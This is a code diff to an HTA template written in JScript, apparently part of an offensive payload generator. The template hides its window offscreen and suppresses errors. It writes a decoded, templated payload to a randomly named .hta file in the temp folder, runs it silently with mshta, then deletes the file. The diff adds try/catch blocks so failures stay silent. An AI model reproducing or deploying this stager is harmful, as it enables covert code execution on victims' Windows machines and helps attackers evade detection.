@@ -2,21 +2,19 @@
  <head>
  <script language="JScript">
 
- window.moveTo(-1000, -2000);
- window.blur();
- window.resizeTo(2, 4);
-
  try
  {
+     window.moveTo(-1000, -2000);
+     window.blur();
+     window.resizeTo(2, 4);
      window.onerror = function(sMsg, sUrl, sLine) { return false; }
      window.onfocus = function() { window.blur(); }
+     var {{variables['file-system-object'][0]}} = {{variables['file-system-object'][1]}}
+     var {{variables['wscript.shell'][0]}} = {{variables['wscript.shell'][1]}}
+     var {{variables['tmp'][0]}} = {{variables['tmp'][1]}}
+     var mshta = unescape("{{code}}")
  }
- catch (e){}
-
-var {{variables['file-system-object'][0]}} = {{variables['file-system-object'][1]}}
-var {{variables['wscript.shell'][0]}} = {{variables['wscript.shell'][1]}}
-var {{variables['tmp'][0]}} = {{variables['tmp'][1]}}
-var mshta = unescape("{{code}}")
+ catch (e){kill()}
 
 function kill() {
   try {
@@ -38,17 +36,19 @@ function kill() {
 }
 
 function main(){
-  var path = {{variables['tmp'][0]}} + "\\\{{variables['random_str']}}.hta";
-  var fd = {{variables['file-system-object'][0]}}.CreateTextFile(path);
-  fd.WriteLine(mshta);
-  fd.close();
-  {{variables['wscript.shell'][0]}}.run("mshta " + path, 0, false)
-  var now = new Date().getTime();
-  while((new Date().getTime() - now) < 5000){
-    // do nothing
-  }
-  {{variables['file-system-object'][0]}}.DeleteFile(path);
-  kill()
+  try {
+    var path = {{variables['tmp'][0]}} + "\\" + "{{variables['random_str']}}" + ".hta";
+    var fd = {{variables['file-system-object'][0]}}.CreateTextFile(path);
+    fd.WriteLine(mshta);
+    fd.close();
+    {{variables['wscript.shell'][0]}}.run("mshta " + path, 0, false)
+    var now = new Date().getTime();
+    while((new Date().getTime() - now) < 5000){
+      // do nothing
+    }
+    {{variables['file-system-object'][0]}}.DeleteFile(path);
+    kill()
+  } catch (e) {kill()}
 }
 
 main()
